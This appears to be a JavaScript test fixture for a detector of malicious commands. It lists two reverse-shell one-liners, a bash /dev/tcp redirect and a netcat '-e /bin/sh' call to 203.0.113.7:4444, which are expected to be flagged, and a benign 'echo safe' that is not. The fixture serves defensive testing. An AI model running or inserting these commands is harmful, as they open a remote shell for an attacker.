export const CASES = [
  {text: 'bash -i >& /dev/tcp/203.0.113.7/4444 0>&1', expectedDetection: true},
  {text: 'nc -e /bin/sh 203.0.113.7 4444', expectedDetection: true},
  {text: 'echo safe', expectedDetection: false}
];
